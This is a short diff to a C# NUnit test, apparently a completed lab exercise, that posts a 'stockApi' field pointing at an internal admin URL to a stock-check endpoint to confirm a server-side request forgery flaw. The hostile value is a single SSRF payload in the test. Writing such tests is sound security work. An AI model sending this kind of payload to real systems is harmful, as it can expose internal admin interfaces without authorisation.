@@ -42,6 +42,13 @@ internal class SSRFTest
     [Test]
     public async Task ValidateSSRFWorks()
     {
-        //= Your code here =//
+        var test = new FormUrlEncodedContent(new Dictionary<string, string>
+        {
+            { "stockApi", "http://192.168.0.181:8080/admin" }
+        });
+
+        var result = await httpClient.PostAsync("/product/stock", test);
+
+        Assert.That(result.StatusCode, Is.EqualTo(HttpStatusCode.OK));
     }
 }
